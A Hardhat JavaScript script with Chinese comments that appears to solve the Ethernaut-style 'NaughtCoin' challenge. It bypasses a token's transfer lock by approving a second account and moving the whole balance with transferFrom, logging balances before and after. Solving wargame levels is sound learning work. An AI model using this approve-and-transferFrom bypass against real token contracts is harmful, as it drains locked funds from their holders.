const { ethers } = require("hardhat");

/*
* 利用隐藏逻辑转移资产
实现方式：通过检查目标合约所继承的父类合约，检查合约限制漏，盗取资金
*/
async function NaughtCoinScript() {
    // NaughtCoin合约地址
    const NaughtCoinAddress = "0x5bF011122185E328446d2A3718E056386Ea01676";
    const naughtCoin = await ethers.getContractAt("NaughtCoin", NaughtCoinAddress);
    const [player, spender] = await ethers.getSigners();

    const playerBalance = await naughtCoin.balanceOf(player.address);

    console.log("攻击前 player balance = ", await naughtCoin.balanceOf(player.address))
    console.log("攻击前 spender balance = ", await naughtCoin.balanceOf(spender.address))

    // 使用 player 进行 transferFrom
    let tx = await naughtCoin.connect(player).approve(spender.address, playerBalance)
    await tx.wait();

    console.log("player allowance spender = ", await naughtCoin.allowance(player.address, spender.address))

    // 使用 spender 进行 transferFrom
    tx = await naughtCoin.connect(spender).transferFrom(player.address, spender.address, playerBalance);
    await tx.wait();

    console.log("攻击后 player balance = ", await naughtCoin.balanceOf(player.address))
    console.log("攻击后 spender balance = ", await naughtCoin.balanceOf(spender.address))
}

NaughtCoinScript().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});